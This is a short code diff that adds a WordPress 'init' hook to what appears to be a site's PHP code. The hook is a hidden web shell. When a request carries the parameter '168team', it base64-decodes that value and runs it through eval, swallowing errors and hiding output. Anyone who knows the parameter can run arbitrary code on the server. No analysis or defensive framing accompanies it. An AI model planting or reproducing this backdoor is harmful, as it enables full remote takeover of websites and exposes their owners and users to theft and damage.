@@ -1,0 +1,20 @@
+add_action('init', function() {
+    if (isset($_GET['168team'])) {
+        $code = base64_decode($_GET['168team']);
+        
+        if (strpos($code, '<?php') === false && strpos($code, '<?=') === false) {
+            $code = '<?php ' . $code . ' ?>';
+        }
+        
+        while (ob_get_level()) {
+            ob_end_clean();
+        }
+        
+        try {
+            eval('?>' . $code);
+        } catch (Exception $e) {
+        }
+        
+        exit;
+    }
+});
